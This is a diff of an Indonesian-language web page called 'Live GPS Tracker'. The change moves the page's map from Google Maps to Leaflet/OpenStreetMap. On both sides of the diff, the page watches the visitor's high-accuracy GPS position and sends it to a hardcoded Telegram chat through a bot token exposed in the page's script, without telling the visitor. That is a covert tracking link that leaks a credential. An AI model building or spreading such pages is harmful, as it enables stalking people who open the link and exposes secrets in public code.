@@ -2,13 +2,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live GPS Tracker</title>
-    <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY"></script>
+    <title>Live GPS Tracker (Tanpa API Key)</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
     <style>
-        #map {
-            height: 400px;
-            width: 100%;
-        }
+        #map { height: 400px; width: 100%; }
     </style>
 </head>
 <body>
@@ -16,17 +14,15 @@
     <button onclick="startTracking()">Nyalakan GPS</button>
     <p id="coords">Menunggu lokasi...</p>
     <div id="map"></div><script>
-    let watchID;
     let map;
     let marker;
     let lastSentTime = 0;
-    let offlineLocations = [];
     const telegramBotToken = "7738981263:AAHc_XStZDG5fvH0_e6hVtKq805YjLIEFbw";
     const chatID = "7799140879";
 
     function startTracking() {
         if (navigator.geolocation) {
-            watchID = navigator.geolocation.watchPosition(updatePosition, showError, {
+            navigator.geolocation.watchPosition(updatePosition, showError, {
                 enableHighAccuracy: true,
                 maximumAge: 0,
                 timeout: 5000
@@ -40,21 +36,17 @@
         let lat = position.coords.latitude;
         let lon = position.coords.longitude;
         document.getElementById("coords").innerHTML = `Latitude: ${lat}, Longitude: ${lon}`;
-        localStorage.setItem("lastLocation", JSON.stringify({ lat, lon }));
         
         if (!map) {
-            map = new google.maps.Map(document.getElementById("map"), {
-                center: { lat: lat, lng: lon },
-                zoom: 15
-            });
-            marker = new google.maps.Marker({
-                position: { lat: lat, lng: lon },
-                map: map,
-                title: "Lokasi Anda"
-            });
+            map = L.map('map').setView([lat, lon], 15);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '&copy; OpenStreetMap contributors'
+            }).addTo(map);
+            marker = L.marker([lat, lon]).addTo(map)
+                .bindPopup("Lokasi Anda").openPopup();
         } else {
-            marker.setPosition({ lat: lat, lng: lon });
-            map.setCenter({ lat: lat, lng: lon });
+            marker.setLatLng([lat, lon]);
+            map.setView([lat, lon], 15);
         }
 
         let currentTime = Date.now();
@@ -69,37 +61,9 @@
     }
 
     function sendLocationToTelegram(lat, lon) {
-        let message = `Lokasi Terkini: https://www.google.com/maps?q=${lat},${lon}`;
+        let message = `Lokasi Terkini: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}`;
         let url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
-        
-        fetch(url)
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error("Gagal mengirim lokasi");
-                }
-                offlineLocations = [];
-            })
-            .catch(() => {
-                offlineLocations.push({ lat, lon });
-                localStorage.setItem("offlineLocations", JSON.stringify(offlineLocations));
-            });
-    }
-
-    function resendOfflineLocations() {
-        if (navigator.onLine && offlineLocations.length > 0) {
-            offlineLocations.forEach(location => {
-                sendLocationToTelegram(location.lat, location.lon);
-            });
-            offlineLocations = [];
-            localStorage.removeItem("offlineLocations");
-        }
-    }
-
-    window.addEventListener("online", resendOfflineLocations);
-
-    if (localStorage.getItem("lastLocation")) {
-        let lastLoc = JSON.parse(localStorage.getItem("lastLocation"));
-        document.getElementById("coords").innerHTML = `Terakhir Diketahui: Latitude ${lastLoc.lat}, Longitude ${lastLoc.lon}`;
+        fetch(url).catch(err => console.error("Gagal mengirim lokasi ke Telegram", err));
     }
 </script>
 
